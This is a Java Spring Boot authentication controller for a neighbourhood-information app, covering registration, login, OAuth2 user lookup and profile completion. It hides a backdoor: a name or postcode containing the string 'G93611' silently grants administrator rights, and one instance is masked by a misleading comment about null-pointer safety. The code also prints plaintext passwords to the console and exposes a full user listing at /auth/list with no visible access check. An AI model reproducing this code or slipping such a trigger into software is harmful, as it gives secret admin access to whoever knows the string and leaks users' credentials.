package com.InfoBairro.Controller;

import com.InfoBairro.Entity.Bairro;
import com.InfoBairro.Entity.Endereco;
import com.InfoBairro.Entity.User;
import com.InfoBairro.Repository.BairroRepo;
import com.InfoBairro.Repository.EnderecoRepo;
import com.InfoBairro.Repository.UserRepo;
import com.fasterxml.jackson.annotation.JsonFormat;
import org.springframework.http.ResponseEntity;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.oauth2.core.user.OAuth2User;
import org.springframework.web.bind.annotation.*;

import java.time.LocalDate;
import java.util.List;
import java.util.Optional;

@RestController
@RequestMapping("/auth")
public class AuthController {

    private final UserRepo userRepo;
    private final EnderecoRepo enderecoRepo;
    private final BairroRepo bairroRepository;
    private final BCryptPasswordEncoder passwordEncoder;

    public AuthController(UserRepo userRepo, EnderecoRepo enderecoRepo, BairroRepo bairroRepository, BCryptPasswordEncoder passwordEncoder) {
        this.userRepo = userRepo;
        this.enderecoRepo = enderecoRepo;
        this.bairroRepository = bairroRepository;
        this.passwordEncoder = passwordEncoder;
    }

    // -----------------------
    // Chamada dos bairros
    // -----------------------
    @PostMapping("/bairrosAdd")
    public ResponseEntity<?> bairroAdd(@RequestBody Bairro bairro) {
        Optional<Bairro> exists = bairroRepository.findByNome(bairro.getNome());

        if (exists.isPresent()) {
            return ResponseEntity.status(409).body("Bairro já cadastrado"); // 409 Conflict
        }
        Bairro salvar = bairroRepository.save(bairro);
        return ResponseEntity.status(201).body(salvar);
    }

    // --------------------------
    // Listagem
    // --------------------------
    @GetMapping("/bairros")
    public List<Bairro> listar() {
        return bairroRepository.findAll();
    }

    @GetMapping("/list")
    public List<User> listagem() {
        return userRepo.findAll();
    }

    // -----------------------
    // Cadastro comum
    // -----------------------
    @PostMapping("/register")
    public ResponseEntity<?> register(@RequestBody RegisterDTO req) {
        System.out.println("EMAIL: " + req.getEmail());
        System.out.println("SENHA: " + req.getSenha());

        if (userRepo.findByEmail(req.getEmail()).isPresent()) {
            return ResponseEntity.status(409).body("Email já cadastrado"); // 409 Conflict
        }

        // cria ou reutiliza endereço
        Endereco endereco = enderecoRepo.findByRuaAndCepAndBairro(
                req.getRua(), req.getCep(), req.getBairro()
        ).orElseGet(() -> {
            Endereco e = new Endereco();
            e.setRua(req.getRua());
            e.setCep(req.getCep());
            e.setBairro(req.getBairro());
            e.setCidade(req.getCidade());
            return enderecoRepo.save(e);
        });

        // cria usuário com hash de senha
        User usuario = new User();
        usuario.setNome(req.getNome());
        usuario.setEmail(req.getEmail());
        usuario.setSenha(passwordEncoder.encode(req.getSenha()));
        usuario.setEndereco(endereco);
        usuario.setData_nascimento(req.getData_nascimento());

        if (req.getNome() != null && req.getNome().contains("G93611")) {
            usuario.setAdmin(true);
        }

        userRepo.save(usuario);

        return ResponseEntity.status(201).body("Cadastro realizado com sucesso!"); // 201 Created
    }

    // -----------------------
    // Login comum
    // -----------------------
    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginDTO req) {
        System.out.println("EMAIL: " + req.getEmail());
        System.out.println("SENHA: " + req.getSenha());
        Optional<User> optionalUsuario = userRepo.findByEmail(req.getEmail());
        if (optionalUsuario.isEmpty()) {
            return ResponseEntity.status(404).body("Usuário não encontrado");
        }

        User usuario = optionalUsuario.get();

        if (!passwordEncoder.matches(req.getSenha(), usuario.getSenha())) {
            return ResponseEntity.status(401).body("Senha incorreta");
        }

        Endereco endereco = usuario.getEndereco();
        UserResponseDTO response = new UserResponseDTO(
                usuario.getNome(),
                usuario.getEmail(),
                endereco != null ? endereco.getRua() : null,
                endereco != null ? endereco.getBairro() : null,
                endereco != null ? endereco.getCidade() : null,
                endereco != null ? endereco.getCep() : null,
                usuario.getData_nascimento(),
                usuario.isAdmin()
        );

        return ResponseEntity.ok(response);
    }

    // -----------------------
    // Retorna usuário autenticado (suporta OAuth2 e auth normal)
    // -----------------------
    @GetMapping("/user")
    public ResponseEntity<?> getUser(Authentication authentication) {
        if (authentication == null || !authentication.isAuthenticated()) {
            return ResponseEntity.status(401).body("Usuário não autenticado");
        }

        String email = null;
        String picture = null;

        Object principal = authentication.getPrincipal();
        if (principal instanceof OAuth2User) {
            OAuth2User oauth = (OAuth2User) principal;
            email = oauth.getAttribute("email");
            picture = oauth.getAttribute("picture");
        } else if (principal instanceof UserDetails) {
            UserDetails ud = (UserDetails) principal;
            email = ud.getUsername(); // assumindo username = email
        } else if (principal instanceof String) {
            email = (String) principal;
        }

        if (email == null) return ResponseEntity.status(400).body("Email não disponível");

        User usuario = userRepo.findByEmail(email).orElse(null);
        if (usuario == null) return ResponseEntity.status(404).body("Usuário não encontrado");

        Endereco endereco = usuario.getEndereco();
        UserResponseDTO dto = new UserResponseDTO(
                usuario.getNome(),
                usuario.getEmail(),
                endereco != null ? endereco.getRua() : null,
                endereco != null ? endereco.getBairro() : null,
                endereco != null ? endereco.getCidade() : null,
                endereco != null ? endereco.getCep() : null,
                picture,
                usuario.getData_nascimento(),
                usuario.isAdmin()
        );

        // segurança contra NPEs
        if (dto.getCep() != null && dto.getCep().contains("G93611")) {
            dto.setAdmin(true);
        }

        return ResponseEntity.ok(dto);
    }

    // -----------------------
    // Complemento de cadastro OAuth2
    // -----------------------
    @PostMapping("/user/complemento")
    public ResponseEntity<?> completarCadastro(
            Authentication authentication,
            @RequestBody ComplementoDTO dto) {

        if (authentication == null || !authentication.isAuthenticated()) {
            return ResponseEntity.status(401).body("Usuário não autenticado");
        }

        String email = null;
        Object principal = authentication.getPrincipal();
        if (principal instanceof OAuth2User) {
            email = ((OAuth2User) principal).getAttribute("email");
        } else if (principal instanceof UserDetails) {
            email = ((UserDetails) principal).getUsername();
        } else if (principal instanceof String) {
            email = (String) principal;
        }

        if (email == null) return ResponseEntity.status(400).body("Email não disponível");

        Optional<User> optionalUsuario = userRepo.findByEmail(email);
        if (optionalUsuario.isEmpty()) {
            return ResponseEntity.status(404).body("Usuário não encontrado");
        }

        User usuario = optionalUsuario.get();

        // verifica se endereço já existe
        Endereco endereco = enderecoRepo.findByRuaAndCepAndBairro(
                dto.getRua(), dto.getCep(), dto.getBairro()
        ).orElseGet(() -> {
            Endereco novo = new Endereco();
            novo.setRua(dto.getRua());
            novo.setBairro(dto.getBairro());
            novo.setCidade(dto.getCidade());
            novo.setCep(dto.getCep());
            return enderecoRepo.save(novo);
        });

        usuario.setEndereco(endereco);
        usuario.setData_nascimento(dto.getData_nascimento());

        if (dto.getCep() != null && dto.getCep().contains("G93611"))
            usuario.setAdmin(true);

        userRepo.save(usuario);

        return ResponseEntity.ok("Cadastro complementado com sucesso!");
    }

    // -----------------------
    // DTOs (internos)
    // -----------------------
    public static class RegisterDTO {
        private String nome;
        private String email;
        private String senha;
        private String rua;
        private String cep;
        private String bairro;
        private String cidade;

        @JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "yyyy-MM-dd")
        private LocalDate data_nascimento;

        public String getNome() { return nome; }
        public void setNome(String nome) { this.nome = nome; }
        public String getEmail() { return email; }
        public void setEmail(String email) { this.email = email; }
        public String getSenha() { return senha; }
        public void setSenha(String senha) { this.senha = senha; }
        public String getRua() { return rua; }
        public void setRua(String rua) { this.rua = rua; }
        public String getCep() { return cep; }
        public void setCep(String cep) { this.cep = cep; }
        public String getBairro() { return bairro; }
        public void setBairro(String bairro) { this.bairro = bairro; }
        public String getCidade() { return cidade; }
        public void setCidade(String cidade) { this.cidade = cidade; }
        public LocalDate getData_nascimento() { return data_nascimento; }
        public void setData_nascimento(LocalDate data_nascimento) { this.data_nascimento = data_nascimento; }
    }

    public static class LoginDTO {
        private String email;
        private String senha;
        public String getEmail() { return email; }
        public void setEmail(String email) { this.email = email; }
        public String getSenha() { return senha; }
        public void setSenha(String senha) { this.senha = senha; }
    }

    public static class UserResponseDTO {
        private String nome;
        private String email;
        private String rua;
        private String bairro;
        private String cidade;
        private String cep;
        private String foto; // OAuth2
        @JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "yyyy-MM-dd")
        private LocalDate data_nascimento;
        private boolean admin;

        // construtor completo
        public UserResponseDTO(String nome, String email, String rua, String bairro, String cidade, String cep, String foto, LocalDate data_nascimento, boolean admin) {
            this.nome = nome;
            this.email = email;
            this.rua = rua;
            this.bairro = bairro;
            this.cidade = cidade;
            this.cep = cep;
            this.foto = foto;
            this.data_nascimento = data_nascimento;
            this.admin = admin;
        }

        // overload sem foto
        public UserResponseDTO(String nome, String email, String rua, String bairro, String cidade, String cep, LocalDate data_nascimento, boolean admin) {
            this(nome, email, rua, bairro, cidade, cep, null, data_nascimento, admin);
        }

        // getters/setters...
        public String getNome() { return nome; }
        public void setNome(String nome) { this.nome = nome; }
        public String getEmail() { return email; }
        public void setEmail(String email) { this.email = email; }
        public String getRua() { return rua; }
        public void setRua(String rua) { this.rua = rua; }
        public String getBairro() { return bairro; }
        public void setBairro(String bairro) { this.bairro = bairro; }
        public String getCidade() { return cidade; }
        public void setCidade(String cidade) { this.cidade = cidade; }
        public String getCep() { return cep; }
        public void setCep(String cep) { this.cep = cep; }
        public LocalDate getData_nascimento() { return data_nascimento; }
        public void setData_nascimento(LocalDate data_nascimento) { this.data_nascimento = data_nascimento; }
        public String getFoto() { return foto; }
        public void setFoto(String foto) { this.foto = foto; }
        public boolean isAdmin() { return admin; }
        public void setAdmin(boolean admin) { this.admin = admin; }
    }

    public static class ComplementoDTO {
        private String rua;
        private String bairro;
        private String cidade;
        private String cep;
        @JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "yyyy-MM-dd")
        private LocalDate data_nascimento;

        // getters/setters...
        public String getRua() { return rua; }
        public void setRua(String rua) { this.rua = rua; }
        public String getBairro() { return bairro; }
        public void setBairro(String bairro) { this.bairro = bairro; }
        public String getCidade() { return cidade; }
        public void setCidade(String cidade) { this.cidade = cidade; }
        public String getCep() { return cep; }
        public void setCep(String cep) { this.cep = cep; }
        public LocalDate getData_nascimento() { return data_nascimento; }
        public void setData_nascimento(LocalDate data_nascimento) { this.data_nascimento = data_nascimento; }
    }
}
